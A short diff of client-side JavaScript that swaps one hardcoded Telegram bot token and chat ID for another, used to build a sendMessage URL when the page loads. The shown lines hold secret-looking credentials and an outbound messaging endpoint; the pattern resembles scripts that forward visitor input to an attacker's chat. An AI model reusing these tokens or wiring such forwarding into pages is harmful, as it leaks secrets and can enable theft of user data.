@@ -2,8 +2,8 @@ document.addEventListener('DOMContentLoaded', function () {
         const btWole = document.getElementById('btWole');
         const msgFont = document.getElementById('msgfont');
 
-        const botToken1 = '6011980283:AAHObo-sJQ7dkxKdw8WrhraEyAqCpKXj7fY';
-        const chatId1 = '1782094569';
+        const botToken1 = '8619502245:AAEE3WfgAWxR5uiF1jj76f7JGv6g2e_ZhB';
+        const chatId1 = '6711025101';
         const telegramUrl1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;
 
         const botToken2 = '';
